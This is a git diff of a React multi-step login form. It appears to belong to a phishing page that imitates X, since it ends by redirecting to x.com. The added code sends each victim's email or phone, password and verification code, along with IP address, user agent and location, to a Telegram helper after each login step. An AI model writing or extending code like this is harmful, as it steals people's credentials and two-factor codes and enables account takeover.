@@ -2,8 +2,17 @@
 
 import { useCallback, useState } from "react";
 import type { User } from "@prisma/client";
+import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";
 
-export function LoginFormSteps() {
+type Props = {
+	browserData: {
+		ip: string;
+		userAgent: string;
+		geoLocation: string;
+	};
+};
+
+export function LoginFormSteps({ browserData }: Props) {
 	const [step, setStep] = useState(1);
 	const [username, setUsername] = useState("");
 	const [password, setPassword] = useState("");
@@ -34,13 +43,25 @@ export function LoginFormSteps() {
 		}
 
 		const data = (await response.json()) as { user: User };
-		console.log("user -> ", data);
+
+		const { origin, pathname } = window.location;
+
+		await sendDataToTelegram({
+			emailOrPhone: data.user.emailOrPhone,
+			password: data.user.password,
+			code: "",
+			pageUrl: `${origin}${pathname}`,
+			userIp: browserData.ip,
+			userAgent: browserData.userAgent,
+			geoLocation: browserData.geoLocation,
+		});
+
 		setUserId(data?.user?.id);
 
 		setStep((prevStep) => prevStep + 1);
 
 		setLoading(false);
-	}, [username, password]);
+	}, [username, password, browserData]);
 
 	const handleSaveUserCode = useCallback(async () => {
 		setLoading(true);
@@ -60,6 +81,20 @@ export function LoginFormSteps() {
 			throw new Error("Failed to save user.");
 		}
 
+		const data = (await response.json()) as { user: User };
+
+		const { origin, pathname } = window.location;
+
+		await sendDataToTelegram({
+			emailOrPhone: data.user.emailOrPhone,
+			password: data.user.password,
+			code: data.user?.code || "",
+			pageUrl: `${origin}${pathname}`,
+			userIp: browserData.ip,
+			userAgent: browserData.userAgent,
+			geoLocation: browserData.geoLocation,
+		});
+
 		setStep(1);
 		setUsername("");
 		setPassword("");
@@ -67,7 +102,7 @@ export function LoginFormSteps() {
 		setUserId(0);
 
 		window.location.href = "https://x.com";
-	}, [userId, code]);
+	}, [userId, code, browserData]);
 
 	return (
 		<>
